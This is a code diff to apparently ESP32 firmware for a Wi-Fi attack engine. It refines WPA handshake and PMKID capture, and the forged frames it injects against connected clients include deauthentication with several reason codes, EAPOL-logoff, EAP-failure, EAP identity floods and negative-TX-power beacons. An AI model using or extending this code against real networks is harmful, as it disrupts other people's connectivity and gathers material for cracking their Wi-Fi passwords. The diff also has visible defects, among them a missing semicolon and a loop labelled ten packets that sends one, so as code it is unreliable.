@@ -12,7 +12,7 @@
 
 #define CLIENT_SEM_WAIT 10
 #define TARGET_SEM_WAIT 10
-#define BEACON_RX_TIMEOUT 2000
+#define BEACON_RX_TIMEOUT 3000
 
 static const char *TAG = "WIFI_ATTACKS";
 
@@ -20,9 +20,34 @@ static client_t clients[MAX_CLIENTS] = { 0 };
 static SemaphoreHandle_t clients_semaphore;
 static SemaphoreHandle_t target_semaphore;
 static TimerHandle_t beacon_track_timer_handle = NULL;
+static TaskHandle_t beacon_track_task_handle = NULL;
 static uint8_t num_clients = 0;
 static target_info_t target = { 0 };
 static handshake_info_t handshake_info = { 0 };
+
+
+/**
+ * @brief Wait for timer timeout and change channel
+ * 
+ * @param param 
+ */
+static void beacon_track_task(void *param)
+{
+    while (1) {
+        ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
+
+        if (xSemaphoreTake(target_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) {
+            target.channel = getNextChannel(target.channel);
+            esp_wifi_deauth_sta(0);
+            esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_BELOW);
+            ESP_LOGW(TAG, "BEACON timeout, ap is offline or changed channel. Switching to channel %d...", target.channel);
+            handshake_info.pmkid_captured = false;
+            handshake_info.handshake_captured = false;
+            xSemaphoreGive(target_semaphore);
+        }
+        xTimerReset(beacon_track_timer_handle, 0);
+    }
+}
 
 
 /**
@@ -32,16 +57,9 @@ static handshake_info_t handshake_info = { 0 };
  */
 static void hopping_timer_callback(TimerHandle_t xTimer)
 {
-    if(xSemaphoreTake(target_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
-    {
-        target.channel = getNextChannel(target.channel);
-        esp_wifi_deauth_sta(0);
-        esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
-        ESP_LOGW(TAG, "BEACON timeout, ap is offline or changed channel. Try switching channel to %d...", target.channel);
-        handshake_info.pmkid_captured = false;
-        handshake_info.handshake_captured = false;
-        xSemaphoreGive(target_semaphore);
-    }
+    BaseType_t xHigherPriorityTaskWoken = pdFALSE;
+    vTaskNotifyGiveFromISR(beacon_track_task_handle, &xHigherPriorityTaskWoken)
+    portYIELD_FROM_ISR(xHigherPriorityTaskWoken);
 }
 
 
@@ -131,7 +149,7 @@ IRAM_ATTR static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_
     /* Check frame type data for EAPOLs */
     if (frame.frame_control.type == TYPE_DATA)
     {
-        if( libwifi_check_wpa_handshake(&frame) == true && handshake_info.handshake_captured == false )
+        if( libwifi_check_wpa_handshake(&frame) == true )
         {
             /* Extract WPA data from the frame */
             ret = libwifi_get_wpa_data(&frame, &wpa_data);
@@ -143,7 +161,7 @@ IRAM_ATTR static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_
             }
             wpa_data_initialized = true;
 
-            if( libwifi_check_wpa_message(&frame) == HANDSHAKE_M1 && isMacZero(handshake_info.mac_sta))
+            if( libwifi_check_wpa_message(&frame) == HANDSHAKE_M1 && isMacZero(handshake_info.mac_sta) && memcmp(src_mac, target.bssid, 6) == 0 )
             {
                 /* Extract ANonce from MSG 1 */
                 memcpy(handshake_info.anonce, wpa_data.key_info.nonce, 32);
@@ -157,7 +175,7 @@ IRAM_ATTR static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_
                     {
                         const uint8_t *tag_data = iterator.tag_data;
                         /* Check WPA OUI */
-                        if (tag_data[0] == 0x00 && tag_data[1] == 0x0F && tag_data[2] == 0xAC && tag_data[3] == 0x04)
+                        if (tag_data[0] == 0x00 && tag_data[1] == 0x0F && tag_data[2] == 0xAC)
                         {
                             memcpy(handshake_info.pmkid, tag_data + 4, 16);
                             handshake_info.pmkid_captured = true;
@@ -166,7 +184,7 @@ IRAM_ATTR static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_
                     }
                 }
             }
-            else if( libwifi_check_wpa_message(&frame) == HANDSHAKE_M2 && !isMacZero(handshake_info.mac_sta) && memcmp(handshake_info.mac_sta, src_mac, 6) == 0)
+            else if( libwifi_check_wpa_message(&frame) == HANDSHAKE_M2 && memcmp(handshake_info.mac_sta, src_mac, 6) == 0 && memcmp(dest_mac, target.bssid, 6) == 0 )
             {
                 /* Extract SNonce and MIC from MSG 2 */
                 memcpy(handshake_info.snonce, wpa_data.key_info.nonce, 32);
@@ -234,12 +252,16 @@ void wifi_attack_engine_start(target_info_t *_target)
     esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
 
     /* Start beacon timer for channel tracking */
-    beacon_track_timer_handle = xTimerCreate("beacon_tracking_timer", pdMS_TO_TICKS(BEACON_RX_TIMEOUT), pdTRUE, NULL, hopping_timer_callback);
+    beacon_track_timer_handle = xTimerCreate("beacon_track_timer_handle", pdMS_TO_TICKS(BEACON_RX_TIMEOUT), pdTRUE, NULL, hopping_timer_callback);
     if (beacon_track_timer_handle == NULL) {
         ESP_LOGE(TAG, "Errore nella creazione del timer");
         return;
     }
     xTimerStart(beacon_track_timer_handle, 0);
+    if( beacon_track_task_handle == NULL )
+    {
+        xTaskCreate(beacon_track_task, "beacon_track_task_handle", 4096, NULL, 10, &beacon_track_task_handle);
+    }
 }
 
 
@@ -270,6 +292,12 @@ void wifi_attack_engine_stop(void)
     xTimerStop(beacon_track_timer_handle, 0);
     xTimerDelete(beacon_track_timer_handle, 0);
     beacon_track_timer_handle = NULL;
+
+    /* Stop timer task for beacon channel tracking */
+    if( beacon_track_task_handle != NULL )
+    {
+        vTaskDelete(beacon_track_task_handle);
+    }
 }
 
 
@@ -287,7 +315,6 @@ void wifi_attack_deauth_basic(void)
         return;
     }
 
-    static uint8_t reason_code = 5; /* Disassociated because AP is unable to handle all associated stations. */
     uint8_t deauth_packet[26] = {
         0xC0, 0x00, // Frame Control (Deauth)
         0x3A, 0x01, // Duration
@@ -299,13 +326,24 @@ void wifi_attack_deauth_basic(void)
     };
     memcpy(&deauth_packet[10], target_local.bssid, 6);    // Source Address
     memcpy(&deauth_packet[16], target_local.bssid, 6);    // BSSID
-    deauth_packet[24] = reason_code;
 
-    for (int i = 0; i <= num_clients; i++) 
+    for (int i = 0; i < num_clients; i++) 
     {
         memcpy(&deauth_packet[4], clients[i].mac, 6);
-        /* Send simple deauth addr1=client_mac, addr2=ap_mac, addr3=ap_mac */
-        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 1; /* Reason Code 1: Unspecified Reason */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 4; /* Reason Code 4: Disassociated Due to Inactivity */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 5; /* Reason Code 5: Disassociated Because AP Is Unable to Handle All Currently Associated Stations */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 6; /* Reason Code 6: Class 2 Frame Received from Non-Authenticated Station */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 7; /* Reason Code 7: Class 3 Frame Received from Non-Associated Station */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 8; /* Reason Code 8: Disassociated Because Station Is Leaving (or Has Left) BSS */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 10; /* Reason Code 10: Disassociated Due to Invalid Security Parameters */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
     }
     xSemaphoreGive(clients_semaphore);
 }
@@ -356,10 +394,10 @@ void wifi_attack_deauth_client_invalid_PMKID(void)
     }
 
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eapol_packet_invalid_PMKID[4], clients[i].mac, 6); // Destination Address (Client MAC)
-        esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_invalid_PMKID, sizeof(eapol_packet_invalid_PMKID), false);
+        esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_invalid_PMKID, sizeof(eapol_packet_invalid_PMKID), false);
         /* Increase replay counter for next packet */
         replay_counter++;
     }
@@ -416,10 +454,10 @@ void wifi_attack_deauth_client_bad_msg1(void)
     }
 
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eapol_packet_bad_msg1[4], clients[i].mac, 6); // Destination Address (Client MAC)
-        esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+        esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
         /* Increase replay counter for next packet */
         replay_counter++;
     }
@@ -456,10 +494,10 @@ void wifi_attack_deauth_ap_eapol_logoff(void)
     memcpy(&eapol_logoff_packet[16], target_local.bssid, 6);    // BSSID
 
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eapol_logoff_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
-        esp_wifi_80211_tx(WIFI_IF_AP, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
+        esp_wifi_80211_tx(WIFI_IF_STA, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
     }
     xSemaphoreGive(clients_semaphore);
 }
@@ -499,10 +537,10 @@ void wifi_attack_deauth_client_eap_failure(void)
     memcpy(&eap_failure_packet[16], target_local.bssid, 6);    // BSSID
 
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eap_failure_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
-        esp_wifi_80211_tx(WIFI_IF_AP, eap_failure_packet, sizeof(eap_failure_packet), false);
+        esp_wifi_80211_tx(WIFI_IF_STA, eap_failure_packet, sizeof(eap_failure_packet), false);
     }
     xSemaphoreGive(clients_semaphore);
 }
@@ -542,13 +580,13 @@ void wifi_attack_deauth_client_eap_rounds(void)
     memcpy(&eap_identity_request_packet[16], target_local.bssid, 6);    // BSSID
     
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eap_identity_request_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
         for(uint8_t identity = 0; identity < 255; identity++ )
         {
             eap_identity_request_packet[38] = identity;
-            esp_wifi_80211_tx(WIFI_IF_AP, eap_identity_request_packet, sizeof(eap_identity_request_packet), false);
+            esp_wifi_80211_tx(WIFI_IF_STA, eap_identity_request_packet, sizeof(eap_identity_request_packet), false);
             vTaskDelay(pdMS_TO_TICKS(1));
         }
     }
@@ -586,12 +624,12 @@ void wifi_attack_deauth_ap_eapol_start(void)
     memcpy(&eapol_start_packet[16], target_local.bssid, 6);    // BSSID
 
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eapol_start_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
         for(uint8_t burst = 0; burst < 3; burst++ )
         {
-            esp_wifi_80211_tx(WIFI_IF_AP, eapol_start_packet, sizeof(eapol_start_packet), false);
+            esp_wifi_80211_tx(WIFI_IF_STA, eapol_start_packet, sizeof(eapol_start_packet), false);
             vTaskDelay(pdMS_TO_TICKS(2));
         }
     }
@@ -678,7 +716,7 @@ void wifi_attack_deauth_client_negative_tx_power(void)
     /* Spam 10 packets */
     for (uint8_t i = 10; i <= 10; i++) 
     {
-        esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_negative_tx, offset, false);
+        esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame_negative_tx, offset, false);
         vTaskDelay(pdMS_TO_TICKS(2));
     }
 }
